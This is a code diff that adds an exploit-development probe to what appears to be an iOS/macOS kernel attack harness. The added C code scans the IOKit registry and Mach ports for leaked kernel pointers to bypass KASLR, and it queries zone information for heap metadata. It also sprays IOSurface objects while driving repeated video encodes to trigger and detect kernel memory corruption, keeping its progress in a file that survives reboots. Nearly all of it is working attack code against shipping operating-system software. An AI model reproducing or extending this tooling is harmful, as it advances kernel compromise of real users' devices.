@@ -14278,6 +14278,367 @@ static void r339_probe(void) {
     fflush(stdout);
 }
 
+/* r344: IOKit registry KASLR leak + zone info + crash threshold with spray
+ * Part A: Enumerate ALL IOKit registry properties looking for kernel pointers
+ *         (0xfffffe pattern). Even one leak = KASLR bypass solved.
+ * Part B: host_zone_info / mach_zone_info for heap metadata addresses.
+ * Part C: Continue crash threshold 339→370 step 1 WITH IOSurface spray.
+ *         Tracks per-encode IOSurface property reads to detect pre-MTE corruption.
+ *         Uses persistent state file (r344_state.bin, magic 0xDEAD0344). */
+
+static void r344_scan_iokit_entry(io_registry_entry_t entry, int depth, int *leak_count) {
+    io_name_t name;
+    IORegistryEntryGetName(entry, name);
+
+    CFMutableDictionaryRef props = NULL;
+    kern_return_t kr = IORegistryEntryCreateCFProperties(entry, &props,
+        kCFAllocatorDefault, kNilOptions);
+    if (kr != KERN_SUCCESS || !props) return;
+
+    CFIndex count = CFDictionaryGetCount(props);
+    if (count > 0) {
+        const void **keys = malloc(sizeof(void*) * count);
+        const void **vals = malloc(sizeof(void*) * count);
+        CFDictionaryGetKeysAndValues(props, keys, vals);
+
+        for (CFIndex i = 0; i < count; i++) {
+            if (CFGetTypeID(vals[i]) == CFNumberGetTypeID()) {
+                int64_t v = 0;
+                CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &v);
+                uint64_t uv = (uint64_t)v;
+                if ((uv & 0xffffff0000000000ULL) == 0xfffffe0000000000ULL ||
+                    (uv & 0xffffff0000000000ULL) == 0xfffffff000000000ULL) {
+                    char kbuf[256] = {0};
+                    if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                        CFStringGetCString((CFStringRef)keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                    rlog("  KPTR LEAK! service=%s key=%s val=0x%llx\n", name, kbuf, uv);
+                    (*leak_count)++;
+                }
+            } else if (CFGetTypeID(vals[i]) == CFDataGetTypeID()) {
+                CFDataRef d = (CFDataRef)vals[i];
+                CFIndex dlen = CFDataGetLength(d);
+                const uint8_t *dp = CFDataGetBytePtr(d);
+                for (CFIndex off = 0; off + 8 <= dlen; off += 4) {
+                    uint64_t qw;
+                    memcpy(&qw, dp + off, 8);
+                    if ((qw & 0xffffff0000000000ULL) == 0xfffffe0000000000ULL ||
+                        (qw & 0xffffff0000000000ULL) == 0xfffffff000000000ULL) {
+                        char kbuf[256] = {0};
+                        if (CFGetTypeID(keys[i]) == CFStringGetTypeID())
+                            CFStringGetCString((CFStringRef)keys[i], kbuf, sizeof(kbuf), kCFStringEncodingUTF8);
+                        rlog("  KPTR LEAK! service=%s key=%s data+0x%lx=0x%llx\n",
+                             name, kbuf, (long)off, qw);
+                        (*leak_count)++;
+                    }
+                }
+            }
+        }
+        free(keys);
+        free(vals);
+    }
+    CFRelease(props);
+
+    /* Recurse into children (limit depth to avoid infinite loops) */
+    if (depth < 6) {
+        io_iterator_t children;
+        kr = IORegistryEntryGetChildIterator(entry, kIOServicePlane, &children);
+        if (kr == KERN_SUCCESS) {
+            io_registry_entry_t child;
+            while ((child = IOIteratorNext(children)) != 0) {
+                r344_scan_iokit_entry(child, depth + 1, leak_count);
+                IOObjectRelease(child);
+            }
+            IOObjectRelease(children);
+        }
+    }
+}
+
+static void r344_probe(void) {
+    rlog("\n=== r344: IOKit KASLR Leak + Zone Info + Crash Threshold ===\n\n");
+    fflush(stdout);
+
+    /* ---- Part A: IOKit registry scan for kernel pointers ---- */
+    rlog("--- Part A: IOKit registry scan for kernel pointer leaks ---\n");
+    fflush(stdout);
+
+    int leak_count = 0;
+    io_registry_entry_t root = IORegistryGetRootEntry(kIOMainPortDefault);
+    if (root) {
+        r344_scan_iokit_entry(root, 0, &leak_count);
+        IOObjectRelease(root);
+    }
+
+    /* Also scan matching services by common names */
+    const char *classes[] = {
+        "IOSurface", "IOSurfaceRoot", "AppleKeyStore",
+        "IOHIDSystem", "IOPMPowerSource", "AppleARMPE",
+        "IOUserClient", "AppleMobileFileIntegrity",
+        "AppleCredentialManager", "AppleSEPManager",
+        "IOGPUDevice", "AGXAccelerator",
+        "AppleAVE2Driver", "AppleAVE2UserClient",
+        "IONetworkInterface", "IOBluetoothHostController",
+        NULL
+    };
+    for (int ci = 0; classes[ci]; ci++) {
+        io_iterator_t it;
+        CFMutableDictionaryRef match = IOServiceMatching(classes[ci]);
+        if (!match) continue;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault, match, &it);
+        if (kr != KERN_SUCCESS) continue;
+        io_service_t svc;
+        while ((svc = IOIteratorNext(it)) != 0) {
+            r344_scan_iokit_entry(svc, 0, &leak_count);
+            IOObjectRelease(svc);
+        }
+        IOObjectRelease(it);
+    }
+
+    rlog("  Total kernel pointer leaks found: %d\n\n", leak_count);
+    fflush(stdout);
+
+    /* ---- Part B: Zone info / mach port kobject ---- */
+    rlog("--- Part B: Mach zone info + port kobject probes ---\n");
+    fflush(stdout);
+
+    /* Try host_zone_info (needs host_priv, likely denied) */
+    mach_port_t host = mach_host_self();
+    mach_zone_name_t *znames = NULL;
+    mach_msg_type_number_t znames_cnt = 0;
+    mach_zone_info_t *zinfo = NULL;
+    mach_msg_type_number_t zinfo_cnt = 0;
+
+    host_zone_info_fn hzi = (host_zone_info_fn)dlsym(RTLD_DEFAULT, "host_zone_info");
+    if (hzi) {
+        kern_return_t kr = hzi(host, &znames, &znames_cnt, &zinfo, &zinfo_cnt);
+        rlog("  host_zone_info: kr=%d count=%u\n", kr, znames_cnt);
+        if (kr == KERN_SUCCESS && znames_cnt > 0) {
+            for (uint32_t zi = 0; zi < znames_cnt && zi < 20; zi++) {
+                rlog("    zone[%u]: name=%s cur=%llu max=%llu elem=%llu\n",
+                     zi, znames[zi].mzn_name,
+                     zinfo[zi].mzi_cur_size, zinfo[zi].mzi_max_size,
+                     zinfo[zi].mzi_elem_size);
+            }
+        }
+    } else {
+        rlog("  host_zone_info: symbol not found\n");
+    }
+
+    /* Try mach_port_kobject on task port and host port */
+    natural_t kotype = 0;
+    mach_vm_address_t koaddr = 0;
+    kern_return_t kr2 = mach_port_kobject(mach_task_self(), mach_task_self(), &kotype, (unsigned int *)&koaddr);
+    rlog("  mach_port_kobject(task_self): kr=%d type=%u addr=0x%llx\n", kr2, kotype, (uint64_t)koaddr);
+
+    kr2 = mach_port_kobject(mach_task_self(), host, &kotype, (unsigned int *)&koaddr);
+    rlog("  mach_port_kobject(host_self): kr=%d type=%u addr=0x%llx\n", kr2, kotype, (uint64_t)koaddr);
+
+    /* Try task_info for virtual memory stats */
+    struct task_vm_info {
+        mach_vm_size_t  virtual_size;
+        integer_t       region_count;
+        integer_t       page_size;
+        mach_vm_size_t  resident_size;
+        mach_vm_size_t  resident_size_peak;
+        mach_vm_size_t  device;
+        mach_vm_size_t  device_peak;
+        mach_vm_size_t  internal;
+        mach_vm_size_t  internal_peak;
+        mach_vm_size_t  external;
+        mach_vm_size_t  external_peak;
+        mach_vm_size_t  reusable;
+        mach_vm_size_t  reusable_peak;
+        mach_vm_size_t  purgeable_volatile_pmap;
+        mach_vm_size_t  purgeable_volatile_resident;
+        mach_vm_size_t  purgeable_volatile_virtual;
+        mach_vm_size_t  compressed;
+        mach_vm_size_t  compressed_peak;
+        mach_vm_size_t  compressed_lifetime;
+        mach_vm_size_t  phys_footprint;
+        mach_vm_address_t min_address;
+        mach_vm_address_t max_address;
+        int64_t         ledger_phys_footprint_peak;
+        int64_t         ledger_purgeable_nonvolatile;
+        int64_t         ledger_purgeable_novolatile_compressed;
+        int64_t         ledger_purgeable_volatile;
+        int64_t         ledger_purgeable_volatile_compressed;
+        int64_t         ledger_tag_network_nonvolatile;
+        int64_t         ledger_tag_network_nonvolatile_compressed;
+        int64_t         ledger_tag_network_volatile;
+        int64_t         ledger_tag_network_volatile_compressed;
+        int64_t         ledger_tag_media_footprint;
+        int64_t         ledger_tag_media_footprint_compressed;
+        int64_t         ledger_tag_media_nofootprint;
+        int64_t         ledger_tag_media_nofootprint_compressed;
+        int64_t         ledger_tag_graphics_footprint;
+        int64_t         ledger_tag_graphics_footprint_compressed;
+        int64_t         ledger_tag_graphics_nofootprint;
+        int64_t         ledger_tag_graphics_nofootprint_compressed;
+        int64_t         ledger_tag_neural_footprint;
+        int64_t         ledger_tag_neural_footprint_compressed;
+        int64_t         ledger_tag_neural_nofootprint;
+        int64_t         ledger_tag_neural_nofootprint_compressed;
+        uint64_t        limit_bytes_remaining;
+    } tvmi;
+    memset(&tvmi, 0, sizeof(tvmi));
+    mach_msg_type_number_t ti_cnt = sizeof(tvmi)/sizeof(integer_t);
+    kr2 = task_info(mach_task_self(), 22 /* TASK_VM_INFO */, (task_info_t)&tvmi, &ti_cnt);
+    rlog("  task_vm_info: kr=%d min_addr=0x%llx max_addr=0x%llx\n",
+         kr2, tvmi.min_address, tvmi.max_address);
+
+    /* Scan our own mach ports for kobject addresses */
+    mach_port_name_array_t names_arr = NULL;
+    mach_msg_type_number_t names_cnt = 0;
+    mach_port_type_array_t types_arr = NULL;
+    mach_msg_type_number_t types_cnt = 0;
+    kr2 = mach_port_names(mach_task_self(), &names_arr, &names_cnt, &types_arr, &types_cnt);
+    if (kr2 == KERN_SUCCESS) {
+        rlog("  mach_port_names: %u ports\n", names_cnt);
+        int port_leak_count = 0;
+        for (uint32_t pi = 0; pi < names_cnt; pi++) {
+            kotype = 0;
+            koaddr = 0;
+            kern_return_t pkr = mach_port_kobject(mach_task_self(), names_arr[pi], &kotype, (unsigned int *)&koaddr);
+            if (pkr == KERN_SUCCESS && koaddr != 0) {
+                uint64_t a = (uint64_t)koaddr;
+                if ((a & 0xffffff0000000000ULL) == 0xfffffe0000000000ULL ||
+                    (a & 0xffff000000000000ULL) == 0xffff000000000000ULL ||
+                    a > 0xffff000000000000ULL) {
+                    rlog("    PORT KPTR! name=0x%x type=%u kotype=%u addr=0x%llx\n",
+                         names_arr[pi], types_arr[pi], kotype, a);
+                    port_leak_count++;
+                }
+            }
+        }
+        rlog("  Port kernel pointer leaks: %d\n", port_leak_count);
+    }
+
+    rlog("\n");
+    fflush(stdout);
+
+    /* ---- Part C: Crash threshold 339→370 step 1 WITH IOSurface spray ---- */
+    rlog("--- Part C: Crash threshold with IOSurface spray ---\n");
+    rlog("  Spraying 200 IOSurface objects, then lid=3 encodes 339→370.\n");
+    rlog("  Checking IOSurface properties after each encode.\n");
+    fflush(stdout);
+
+    /* State file for reboot persistence */
+    #define R344_MAGIC 0xDEAD0344
+    struct r344_state { uint32_t magic; uint32_t last_count; };
+
+    char statepath[512];
+    snprintf(statepath, sizeof(statepath), "%s/Documents/r344_state.bin",
+             getenv("HOME") ? getenv("HOME") : "/tmp");
+    struct r344_state st = {0, 0};
+    int stfd = open(statepath, O_RDONLY);
+    if (stfd >= 0) {
+        read(stfd, &st, sizeof(st));
+        close(stfd);
+    }
+    uint32_t start_count = 339;
+    if (st.magic == R344_MAGIC && st.last_count >= 339 && st.last_count < 370) {
+        start_count = st.last_count + 1;
+        rlog("  Resuming from state file: last_count=%u, starting at %u\n", st.last_count, start_count);
+    }
+
+    if (start_count > 370) {
+        rlog("  All counts tested (339-370), no crash.\n");
+        goto r344_done;
+    }
+
+    /* Spray IOSurface objects */
+    #define R344_SURF_COUNT 200
+    IOSurfaceRef surfs[R344_SURF_COUNT];
+    uint32_t surf_seeds[R344_SURF_COUNT];
+    memset(surfs, 0, sizeof(surfs));
+
+    CFMutableDictionaryRef surfDict = CFDictionaryCreateMutable(NULL, 4,
+        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+    CFNumberRef nw64 = CFNumberCreate(NULL, kCFNumberIntType, &(int){64});
+    CFNumberRef nh64 = CFNumberCreate(NULL, kCFNumberIntType, &(int){64});
+    CFNumberRef nbpe = CFNumberCreate(NULL, kCFNumberIntType, &(int){4});
+    CFNumberRef npf  = CFNumberCreate(NULL, kCFNumberIntType, &(int){0x42475241});
+    CFDictionarySetValue(surfDict, CFSTR("IOSurfaceWidth"), nw64);
+    CFDictionarySetValue(surfDict, CFSTR("IOSurfaceHeight"), nh64);
+    CFDictionarySetValue(surfDict, CFSTR("IOSurfaceBytesPerElement"), nbpe);
+    CFDictionarySetValue(surfDict, CFSTR("IOSurfacePixelFormat"), npf);
+    for (int si = 0; si < R344_SURF_COUNT; si++) {
+        surfs[si] = IOSurfaceCreate(surfDict);
+    }
+    CFRelease(nw64); CFRelease(nh64); CFRelease(nbpe); CFRelease(npf);
+    rlog("  Sprayed %d IOSurface objects.\n", R344_SURF_COUNT);
+
+    /* Record initial seeds */
+    for (int si = 0; si < R344_SURF_COUNT; si++) {
+        if (surfs[si]) surf_seeds[si] = IOSurfaceGetSeed(surfs[si]);
+    }
+
+    /* Test each encode count */
+    for (uint32_t cnt = start_count; cnt <= 370; cnt++) {
+        /* Save state BEFORE this encode attempt */
+        st.magic = R344_MAGIC;
+        st.last_count = cnt;
+        int wfd = open(statepath, O_WRONLY | O_CREAT | O_TRUNC, 0644);
+        if (wfd >= 0) { write(wfd, &st, sizeof(st)); close(wfd); }
+
+        /* Create encoder and do 'cnt' lid=3 encodes */
+        VTCompressionSessionRef enc = create_mvhevc_encoder(64, 64, 3);
+        if (!enc) {
+            rlog("  [lid=3 x%u] encoder create FAILED\n", cnt);
+            continue;
+        }
+
+        int ok = 0, err = 0;
+        for (uint32_t ei = 0; ei < cnt; ei++) {
+            int r = encode_one_stereo_lid(enc, 64, 64, 3);
+            if (r == 0) ok++;
+            else err++;
+        }
+
+        VTCompressionSessionInvalidate(enc);
+        CFRelease(enc);
+
+        /* Check IOSurface properties for corruption */
+        int changes = 0;
+        for (int si = 0; si < R344_SURF_COUNT; si++) {
+            if (!surfs[si]) continue;
+            uint32_t seed_now = IOSurfaceGetSeed(surfs[si]);
+            if (seed_now != surf_seeds[si]) {
+                rlog("    SEED CHANGE surf[%d]: %u → %u after x%u\n", si, surf_seeds[si], seed_now, cnt);
+                changes++;
+            }
+            /* Also try reading width/height for corruption */
+            size_t w = IOSurfaceGetWidth(surfs[si]);
+            size_t h = IOSurfaceGetHeight(surfs[si]);
+            size_t bpr = IOSurfaceGetBytesPerRow(surfs[si]);
+            size_t as = IOSurfaceGetAllocSize(surfs[si]);
+            if (w != 64 || h != 64) {
+                rlog("    DIM CHANGE surf[%d]: w=%zu h=%zu after x%u\n", si, w, h, cnt);
+                changes++;
+            }
+            if (bpr != 256 && bpr != 0) {
+                rlog("    BPR CHANGE surf[%d]: bpr=%zu after x%u\n", si, bpr, cnt);
+                changes++;
+            }
+        }
+
+        rlog("  [lid=3 x%u] ok=%u err=%u changes=%d %s\n", cnt, ok, err, changes,
+             changes > 0 ? "CORRUPTION!" : "SURVIVED");
+        fflush(stdout);
+    }
+
+    rlog("  All encode counts survived (339-370).\n");
+
+    /* Cleanup IOSurfaces */
+    for (int si = 0; si < R344_SURF_COUNT; si++) {
+        if (surfs[si]) CFRelease(surfs[si]);
+    }
+    CFRelease(surfDict);
+
+r344_done:
+    rlog("\n=== r344 complete ===\n");
+    fflush(stdout);
+}
+
 /* r343: Natural bucket timing KASLR + exact crash threshold
  * Part A: Measure ulock_wake timing across all 1024 buckets WITHOUT adding
  *         our own waiters — detect kernel-loaded buckets from natural timing.
@@ -47385,6 +47746,13 @@ new_modes:
             IOObjectRelease(r251_svc);
             r251_done:
             rlog("*** r=251 complete ***\n");
+            goto done;
+        }
+        if (rounds == 347) {
+            rlog("*** rounds=347: IOKit KASLR Leak + Zone Info + Crash Threshold ***\n");
+            rlog("  r343: KernelSnitch timing inconclusive (measures userspace contention).\n");
+            rlog("  r344: IOKit registry scan, zone info, crash threshold with spray.\n\n");
+            r344_probe();
             goto done;
         }
         if (rounds == 346) {
